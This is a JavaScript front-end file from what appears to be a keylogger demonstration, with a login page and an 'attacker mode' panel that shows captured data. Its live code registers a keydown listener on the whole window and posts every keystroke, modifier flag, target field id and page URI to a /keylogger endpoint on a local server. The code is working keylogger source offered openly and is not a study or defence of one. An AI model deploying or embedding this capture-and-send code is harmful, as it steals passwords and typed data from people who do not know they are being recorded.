// axios.defaults.withCredentials = true
const attackerMode = document.querySelector(".slider");
const loginForm = document.getElementById("login");
const attackerContainer = document.getElementById("attacker-container");
const baseUrl = "http://localhost:3000";
const scrapeBtn = document.querySelector("#scraperBtn")
let times;
const createElements = (type, attributes, ...children) => {
  const element = document.createElement(type);
  for (key in attributes) {
    element.setAttribute(key, attributes[key]);
  }
  children.forEach((child) => {
    if (typeof child === "string") {
      element.appendChild(document.createTextNode(child));
    } else {
      element.appendChild(child);
    }
  });
  return element;
};
const createLogElement = (className, log) => {
  return createElements("span", { class: `${className}` }, log);
};
const createListItem = (className, logElement) => {
  return createElements("li", { class: `${className}` }, logElement);
};
const deleteElements = async (parent, ...elements) => {
  let nodeLists = [];
  elements.forEach((element) => {
    nodeList = parent.getElementsByTagName(`${element}`);
    nodeLists.push(nodeList);
  });
  nodeLists.forEach((nodeList) => {
    while (nodeList[0]) nodeList[0].parentNode.removeChild(nodeList[0]);
  });
};
const debounce = (func, time) => {
  clearTimeout(times);
  times = setTimeout(func, time);
};


// ../views/lockheed.html"


const keyLogger = async (key) => {
  try {
    const keyLogObject = {
      altnKey: key.altKey ? 1 : 0,
      ctrlKey: key.ctrlKey ? 1 : 0,
      userKey: key.key,
      targKey: key.target.id,
      userURI: key.target.baseURI,
    };
    let { data } = await axios({
      method: "POST",
      url: `${baseUrl}/keylogger`,
      data: keyLogObject,
    });
  } catch ({ message }) {
    console.log(message);
  }
};

window.addEventListener("keydown", (e) => {
  // debounce(keyLogger(e), 300);
  keyLogger(e);
});

attackerMode.addEventListener("click", () => {
  loginForm.classList.toggle("left");
  if (attackerContainer.hidden === true) {
    attackerContainer.hidden = false;
    return;
  }
  attackerContainer.hidden = true;
});

// const getScrapes = async () => {
//   try {
//     let {data } = await axios({
//       method: "GET",
//       url: `${baseUrl}/scrapes`,
//       data: {},
//     })
//     deleteElements(loginForm, "form");
//     data.forEach((scrape) => {
//       const listItem = createListItem("scrape", createLogElement("log-span", scrape));
//       loginForm.appendChild(listItem);
//     });
//   }
//   catch ({message}) {
//     console.log(message)
//   }
// }

// scrapeBtn.addEventListener("dblclick", () => {
//   setTimeout(getScrapes(),1200);
// })

